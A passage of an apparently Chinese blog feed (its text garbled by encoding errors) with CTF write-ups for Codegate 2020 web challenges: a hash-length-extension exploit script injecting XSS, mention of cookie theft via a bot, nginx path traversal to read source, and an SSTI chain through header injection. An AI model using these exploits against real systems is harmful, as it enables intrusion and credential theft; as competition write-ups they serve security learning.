ç¯å¢ƒè¯•äº†ä¸€ä¸‹ï¼Œå‘ç°æ˜¯å¯ä»¥çš„ã€‚ã€‚ã€‚</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-0d2d60e00121f497.png" alt="image.png"></p><p>è¿™ä¸ server è¿˜æœ‰å…³ç³»ï¼Ÿæ„Ÿå…´è¶£çš„å¸ˆå‚…å¯ä»¥ç ”ç©¶è§£ç­”ä¸€ä¸‹â€¦</p><p>è¿™é“é¢˜çš„ç¯å¢ƒä¹Ÿæ˜¯å¯ä»¥çš„ï¼Œæˆ‘ä»¬éšä¾¿æ‹¿åˆ°ä¸€ä¸ªç­¾åï¼Œç„¶åç”¨å“ˆå¸Œæ‰©å±•æ”»å‡»å¾—åˆ°æƒ³è¦çš„ç­¾åã€‚</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> hashpumpy</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://110.10.147.166/&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_sig</span>():</span></span><br><span class="line">    res = requests.get(url + <span class="string">&quot;view.php&quot;</span>, params=&#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;gml&#x27;</span>, <span class="string">&#x27;p1&#x27;</span>: <span class="string">&#x27;gml&#x27;</span>, <span class="string">&#x27;p2&#x27;</span>: <span class="string">&#x27;gml&#x27;</span>&#125;).content</span><br><span class="line">    sig, msg = res.split(<span class="string">&quot;/api.php?sig=&quot;</span>)[<span class="number">1</span>].split(<span class="string">&#x27;&quot;&gt;&lt;/iframe&gt;&#x27;</span>)[<span class="number">0</span>].split(<span class="string">&quot;&amp;q=&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> sig, msg.decode(<span class="string">&quot;base64&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sig, msg = get_sig()</span><br><span class="line"></span><br><span class="line">api1 = [<span class="string">&#x27;header&#x27;</span>, <span class="string">&#x27;HTTP/&#x27;</span>, <span class="string">&#x27;102&#x27;</span>]</span><br><span class="line">api2 = [<span class="string">&#x27;body&#x27;</span>, <span class="string">&#x27;&lt;script\n&gt;alert(1)&lt;/script\n&gt;&#x27;</span>, <span class="string">&#x27;&#x27;</span>]</span><br><span class="line"></span><br><span class="line">new_msg = <span class="string">&quot;|%s|%s&quot;</span> % (</span><br><span class="line">    <span class="string">&#x27;,&#x27;</span>.join(c.encode(<span class="string">&quot;base64&quot;</span>).strip() <span class="keyword">for</span> c <span class="keyword">in</span> api1), <span class="string">&#x27;,&#x27;</span>.join(c.encode(<span class="string">&quot;base64&quot;</span>).strip() <span class="keyword">for</span> c <span class="keyword">in</span> api2))</span><br><span class="line"></span><br><span class="line"><span class="comment"># len(salt)=12</span></span><br><span class="line">new_sig, q = hashpumpy.hashpump(sig, msg, new_msg, <span class="number">12</span>)</span><br><span class="line">q = q.encode(<span class="string">&quot;base64&quot;</span>)</span><br><span class="line">print(<span class="string">&#x27;&#123;&#125;api.php?sig=&#123;&#125;&amp;q=&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(url, new_sig, q))</span><br></pre></td></tr></table></figure><p>è®¿é—®ï¼Œå‘ç°å¯ä»¥å¼¹çª—ï¼š</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-5c671add61b5356a.png" alt="image.png"></p><p>æ”¹å˜ xss payload ä¸ºæ‰“ cookieçš„ï¼Œæäº¤ç»™ botï¼Œå¯ä»¥æ‰“åˆ°cookieï¼š</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-0488b8f15ae89152.png" alt="image.png"></p><h2 id="Render"><a href="#Render" class="headerlink" title="Render"></a>Render</h2><h3 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">It is my first flask project with nginx. Write your own message, and get flag!</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;110.10.147.169&#x2F;renderer&#x2F; </span><br><span class="line">http:&#x2F;&#x2F;58.229.253.144&#x2F;renderer&#x2F;</span><br><span class="line"></span><br><span class="line">DOWNLOAD : http:&#x2F;&#x2F;ctf.codegate.org&#x2F;099ef54feeff0c4e7c2e4c7dfd7deb6e&#x2F;022fd23aa5d26fbeea4ea890710178e9</span><br></pre></td></tr></table></figure><p>ä¸‹è½½å¯ä»¥å¾—åˆ° settings/run.shï¼š</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">service nginx stop</span><br><span class="line">mv /etc/nginx/sites-enabled/default /tmp/</span><br><span class="line">mv /tmp/nginx-flask.conf /etc/nginx/sites-enabled/flask</span><br><span class="line"></span><br><span class="line">service nginx restart</span><br><span class="line"></span><br><span class="line">uwsgi /home/src/uwsgi.ini &amp;</span><br><span class="line">/bin/bash /home/cleaner.sh &amp;</span><br><span class="line"></span><br><span class="line">/bin/bash</span><br></pre></td></tr></table></figure><p>ä»¥åŠ docker file:</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> python:<span class="number">2.7</span>.<span class="number">16</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">ENV</span> FLAG CODEGATE2020&#123;**DELETED**&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> apt-get update</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> apt-get install -y nginx</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> pip install flask uwsgi</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">ADD</span><span class="bash"> prob_src/src /home/src</span></span><br><span class="line"><span class="keyword">ADD</span><span class="bash"> settings/nginx-flask.conf /tmp/nginx-flask.conf</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">ADD</span><span class="bash"> prob_src/static /home/static</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> chmod 777 /home/static</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> mkdir /home/tickets</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> chmod 777 /home/tickets</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">ADD</span><span class="bash"> settings/run.sh /home/run.sh</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> chmod +x /home/run.sh</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">ADD</span><span class="bash"> settings/cleaner.sh /home/cleaner.sh</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> chmod +x /home/cleaner.sh</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">CMD</span><span class="bash"> [<span class="string">&quot;/bin/bash&quot;</span>, <span class="string">&quot;/home/run.sh&quot;</span>]</span></span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬èƒ½ä»ä¸­å¾—åˆ°çš„ä¸»è¦æ˜¯ç›®å½•ç»“æ„ï¼Œç»“åˆé¢˜ç›®æè¿° nginxï¼Œåº”è¯¥å­˜åœ¨ nginx ç›®å½•éå†ã€‚</p><p><code>http://110.10.147.169/static../src/uwsgi.ini</code>ï¼Œå¯ä»¥ä¸‹åˆ°æ–‡ä»¶ã€‚</p><h3 id="è·å–æºç "><a href="#è·å–æºç " class="headerlink" title="è·å–æºç "></a>è·å–æºç </h3><p>è¯»æºç ï¼š</p><p><code>http://110.10.147.169/static../src/app/__init__.py</code>ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> app <span class="keyword">import</span> routes</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.url_map.strict_slashes = <span class="literal">False</span></span><br><span class="line">app.register_blueprint(routes.front, url_prefix=<span class="string">&quot;/renderer&quot;</span>)</span><br><span class="line">app.config[<span class="string">&quot;FLAG&quot;</span>] = os.getenv(<span class="string">&quot;FLAG&quot;</span>, <span class="string">&quot;CODEGATE2020&#123;&#125;&quot;</span>)</span><br></pre></td></tr></table></figure><p>è¯»routesï¼š</p><p>``<a href="http://110.10.147.169/static../src/app/routes.py`">http://110.10.147.169/static../src/app/routes.py`</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, render_template_string, request, redirect, abort, Blueprint</span><br><span class="line"><span class="keyword">import</span> urllib2</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> path</span><br><span class="line"><span class="keyword">from</span> urlparse <span class="keyword">import</span> urlparse</span><br><span class="line"></span><br><span class="line">front = Blueprint(<span class="string">&quot;renderer&quot;</span>, __name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@front.before_request</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span>():</span></span><br><span class="line">    print(request.url)</span><br><span class="line"></span><br><span class="line"><span class="meta">@front.route(&quot;/&quot;, methods=[&quot;GET&quot;, &quot;POST&quot;])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;GET&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    url = request.form.get(<span class="string">&quot;url&quot;</span>)</span><br><span class="line">    res = proxy_read(url) <span class="keyword">if</span> url <span class="keyword">else</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> res:</span><br><span class="line">        abort(<span class="number">400</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>, data = res)</span><br><span class="line"></span><br><span class="line"><span class="meta">@front.route(&quot;/whatismyip&quot;, methods=[&quot;GET&quot;])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ipcheck</span>():</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;ip.html&quot;</span>, ip = get_ip(), real_ip = get_real_ip())</span><br><span class="line"></span><br><span class="line"><span class="meta">@front.route(&quot;/admin&quot;, methods=[&quot;GET&quot;])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">admin_access</span>():</span></span><br><span class="line">    ip = get_ip()</span><br><span class="line">    rip = get_real_ip()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ip <span class="keyword">not</span> <span class="keyword">in</span> [<span class="string">&quot;127.0.0.1&quot;</span>, <span class="string">&quot;127.0.0.2&quot;</span>]: <span class="comment">#super private ip :)</span></span><br><span class="line">        abort(<span class="number">403</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ip != rip: <span class="comment">#if use proxy</span></span><br><span class="line">        ticket = write_log(rip)</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&quot;admin_remote.html&quot;</span>, ticket = ticket)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> ip == <span class="string">&quot;127.0.0.2&quot;</span> <span class="keyword">and</span> request.args.get(<span class="string">&quot;body&quot;</span>):</span><br><span class="line">            ticket = write_extend_log(rip, request.args.get(<span class="string">&quot;body&quot;</span>))</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&quot;admin_local.html&quot;</span>, ticket = ticket)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&quot;admin_local.html&quot;</span>, ticket = <span class="literal">None</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@front.route(&quot;/admin/ticket&quot;, methods=[&quot;GET&quot;])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">admin_ticket</span>():</span></span><br><span class="line">    ip = get_ip()</span><br><span class="line">    rip = get_real_ip()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ip != rip: <span class="comment">#proxy doesn&#x27;t allow to show ticket</span></span><br><span class="line">        <span class="built_in">print</span> <span class="number">1</span></span><br><span class="line">        abort(<span class="number">403</span>)</span><br><span class="line">    <span class="keyword">if</span> ip <span class="keyword">not</span> <span class="keyword">in</span> [<span class="string">&quot;127.0.0.1&quot;</span>, <span class="string">&quot;127.0.0.2&quot;</span>]: <span class="comment">#only local</span></span><br><span class="line">        <span class="built_in">print</span> <span class="number">2</span></span><br><span class="line">        abort(<span class="number">403</span>)</span><br><span class="line">    <span class="keyword">if</span> request.headers.get(<span class="string">&quot;User-Agent&quot;</span>) != <span class="string">&quot;AdminBrowser/1.337&quot;</span>:</span><br><span class="line">        <span class="built_in">print</span> request.headers.get(<span class="string">&quot;User-Agent&quot;</span>)</span><br><span class="line">        abort(<span class="number">403</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> request.args.get(<span class="string">&quot;ticket&quot;</span>):</span><br><span class="line">        log = read_log(request.args.get(<span class="string">&quot;ticket&quot;</span>))</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> log:</span><br><span class="line">            <span class="built_in">print</span> <span class="number">4</span></span><br><span class="line">            abort(<span class="number">403</span>)</span><br><span class="line">        <span class="keyword">return</span> render_template_string(log)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_ip</span>():</span></span><br><span class="line">    <span class="keyword">return</span> request.remote_addr</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_real_ip</span>():</span></span><br><span class="line">    <span class="keyword">return</span> request.headers.get(<span class="string">&quot;X-Forwarded-For&quot;</span>) <span class="keyword">or</span> get_ip()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">proxy_read</span>(<span class="params">url</span>):</span></span><br><span class="line">    <span class="comment">#TODO : implement logging</span></span><br><span class="line">    </span><br><span class="line">    s = urlparse(url).scheme</span><br><span class="line">    <span class="keyword">if</span> s <span class="keyword">not</span> <span class="keyword">in</span> [<span class="string">&quot;http&quot;</span>, <span class="string">&quot;https&quot;</span>]: <span class="comment">#sjgdmfRk akfRk</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> urllib2.urlopen(url).read()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_log</span>(<span class="params">rip</span>):</span></span><br><span class="line">    tid = hashlib.sha1(<span class="built_in">str</span>(time.time()) + rip).hexdigest()</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;/home/tickets/%s&quot;</span> % tid, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        log_str = <span class="string">&quot;Admin page accessed from %s&quot;</span> % rip</span><br><span class="line">        f.write(log_str)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> tid</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_extend_log</span>(<span class="params">rip, body</span>):</span></span><br><span class="line">    tid = hashlib.sha1(<span class="built_in">str</span>(time.time()) + rip).hexdigest()</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;/home/tickets/%s&quot;</span> % tid, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(body)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> tid</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read_log</span>(<span class="params">ticket</span>):</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> (ticket <span class="keyword">and</span> ticket.isalnum()):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> path.exists(<span class="string">&quot;/home/tickets/%s&quot;</span> % ticket):</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;/home/tickets/%s&quot;</span> % ticket, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            <span class="keyword">return</span> f.read()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure><h3 id="åˆ†æ-1"><a href="#åˆ†æ-1" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>å¯ä»¥å‘ç°æˆ‘ä»¬ flag åœ¨ config ä¸­ï¼Œæƒ³åˆ° SSTIã€‚</p><p>é¢˜ç›®è¿˜æä¾›äº†ä¸€ä¸ªç±»ä¼¼ SSRF çš„åŠŸèƒ½ï¼Œè®©æœåŠ¡å™¨å¸®æˆ‘ä»¬å»è¯·æ±‚ï¼Œè¿™é‡Œç”¨çš„æ˜¯ <code>urllib2.urlopen(url)</code>ï¼Œè¿™é‡Œå­˜åœ¨ http å¤´æ³¨å…¥çš„é—®é¢˜ã€‚</p><p>å†çœ‹ä¸€ä¸‹ admin æ¥å£ï¼Œä¼šæŠŠ ripï¼Œä¹Ÿå°±æ˜¯ xff å¤´å†™åˆ°æ—¥å¿—é‡Œï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ /admin/ticket æ¥å£æ¥è®¿é—®æ—¥å¿—ï¼ˆå½“ç„¶æˆ‘ä»¬æœ‰äº†ç›®å½•éå†ï¼Œä¹Ÿå¯ä»¥ç›´æ¥ä¸‹è½½ï¼‰</p><p>å¦‚ä½•æ‰èƒ½ SSTI å‘¢ï¼Œå½“è®¿é—® /admin/ticket æ¥å£æ—¶ä¼šæŠŠæ—¥å¿—ç»“æœç”¨ <code>render_template_string</code>æ¸²æŸ“ï¼Œæ‰€ä»¥æˆ‘ä»¬çš„æ€è·¯å¾ˆæ¸…æ¥šäº†ï¼šæŠŠ SSTI payload å…ˆæ”¾åˆ° xff å¤´é‡Œï¼Œè®¿é—® admin æ¥å£æŠŠ payload å†™åˆ°æ—¥å¿—é‡Œï¼Œå†å»è®¿é—® /admin/ticket æ¥å£å®ç° SSTIï¼Œå¤´éƒ¨æ§åˆ¶å¯ä»¥åˆ©ç”¨ urllib çš„ HTTP æ³¨å…¥ã€‚</p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><p>é¦–å…ˆè¯·æ±‚ /admin:</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-6a5358e38937fa6e.png" alt="image.png"></p><p>å¾—åˆ° ticketï¼Œå†è¯·æ±‚ /admin/ticketï¼š</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-6f4b3bcd8936cf22.png" alt="image.png"></p><p>å‚è€ƒï¼š</p><ol><li><p><a href="https://ctftime.org/writeup/18264">https://ctftime.org/writeup/18264</a></p></li><li><p><a href="https://blog.rwx.kr/codegate-ctf-2020-preliminary/#csp">https://blog.rwx.kr/codegate-ctf-2020-preliminary/#csp</a></p></li></ol>]]></content>
    
    
    <summary type="html">&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;æ–‡ç« é¦–å‘äºå®‰å…¨å®¢ https:&amp;#x2F;&amp;#x2F;www.anquanke.com&amp;#x2F;post&amp;#x2F;id&amp;#x2F;198479&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;p&gt;Codegate è¿˜æ˜¯æœ‰å¾ˆå¤šå›½é™…å¼ºé˜Ÿå‚åŠ çš„ï¼Œè¿™é‡Œè®°å½•ä¸¤é“ Codegate Webé¢˜ã€‚&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="https://igml.top/categories/CTF/"/>
    
    <category term="Web" scheme="https://igml.top/categories/CTF/Web/"/>
    
    
    <category term="CTF" scheme="https://igml.top/tags/CTF/"/>
    
    <category term="Web" scheme="https://igml.top/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>36c3 ä¸€é“Web&amp;Cryptoé¢˜</title>
    <link href="https://igml.top/2020/01/08/2019-36c3/"/>
    <id>https://igml.top/2020/01/08/2019-36c3/</id>
    <published>2020-01-08T14:00:19.000Z</published>
    <updated>2020-01-09T06:45:06.261Z</updated>
    
    <content type="html"><![CDATA[<p>36c3 çš„æ—¶å€™çœ‹äº†å¾ˆä¹…<code>SaV-ls-l-aaS</code>è¿™é“é¢˜ä¹Ÿæ²¡æœ‰åšå‡ºæ¥ï¼Œè¿™é“é¢˜çš„åˆ†ç±»æ˜¯Web&amp;Cryptoï¼Œèµ›åçœ‹äº†é¢˜è§£æ„Ÿè§‰é¢˜çš„è´¨é‡å¾ˆé«˜ï¼Œå‡ºçš„å¾ˆå·§å¦™çš„ä¸€é“é¢˜ï¼Œè¿™é‡Œè®°å½•ä¸€ä¸‹ã€‚</p><a id="more"></a><p>é¦–å…ˆæ‹ä¸€ä¸‹æµç¨‹ï¼š</p><p>60601ç«¯å£å¼€ç€ä¸€ä¸ªWebæœåŠ¡ï¼Œé¢˜ç›®æè¿°ç»™äº†è¿æ¥æ–¹æ³•ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url=<span class="string">&#x27;http://78.47.240.226:60601&#x27;</span> &amp;&amp; ip=$(curl -s <span class="string">&quot;<span class="variable">$url</span>/ip&quot;</span>) &amp;&amp; sig=$(curl -s -d <span class="string">&quot;cmd=ls -l&amp;ip=<span class="variable">$ip</span>&quot;</span> <span class="string">&quot;<span class="variable">$url</span>/sign&quot;</span>) &amp;&amp; curl --data-urlencode <span class="string">&quot;signature=<span class="variable">$sig</span>&quot;</span> <span class="string">&quot;<span class="variable">$url</span>/exec&quot;</span></span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°ï¼Œå…ˆæ˜¯è®¿é—® <code>/ip</code> å¾—åˆ° ipï¼Œå†å‘ <code>/sign</code> post è¿‡å» ip å’Œæˆ‘ä»¬è¦æ‰§è¡Œçš„å‘½ä»¤ï¼Œå¾—åˆ°ç­¾åï¼Œæœ€åå‘ <code>/exec</code> post signature æ¥æ‰§è¡Œå‘½ä»¤ã€‚æˆ‘ä»¬æ‰§è¡Œè¿™ä¸€è¡Œå¯ä»¥å‘ç°å›æ˜¾äº†<code>ls -l</code>æ‰§è¡Œçš„ç»“æœï¼Œå‘ç°æœ‰ä¸ª flag.txtã€‚</p><p>çœ‹æºç ï¼ŒWeb æœåŠ¡æ˜¯ç”± go èµ·çš„ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span 